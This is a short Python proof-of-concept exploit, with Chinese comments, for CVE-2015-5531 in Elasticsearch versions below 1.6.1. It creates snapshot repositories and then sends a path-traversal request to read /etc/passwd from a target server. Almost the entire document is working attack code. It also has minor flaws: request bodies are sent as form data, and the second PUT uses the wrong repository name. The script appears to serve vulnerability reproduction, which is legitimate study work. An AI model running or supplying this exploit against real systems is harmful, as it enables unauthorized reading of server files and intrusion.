#@author Firbasky
#参考https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

"""
漏洞原理
elasticsearch 1.5.1及以前，无需任何配置即可触发该漏洞。
之后的新版，配置文件elasticsearch.yml中必须存在path.repo，
该配置值为一个目录，且该目录必须可写，等于限制了备份仓库的根位置。不配置该值，默认不启动这个功能。

影响版本
ElasticSearch 1.6.1以下
"""
url = "http://ip"

headers = {"Content-type": "application/json","Accept": "*/*"}

# /_snapshot/test  PUT
add_Warehouse = {
    "type": "fs",
    "settings": {
        "location": "/usr/share/elasticsearch/repo/test" 
    }
}
# PUT /_snapshot/test2
add_snapshot = {
    "type": "fs",
    "settings": {
        "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata" 
    }
}

requests.request("PUT",url=url+"/_snapshot/test",data=add_Warehouse,verify=False,headers=headers)

requests.request("PUT",url=url+"/_snapshot/test",data=add_snapshot,verify=False,headers=headers)

r = requests.request("GET",url=url+"/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",verify=False,headers=headers)

print(r.text)
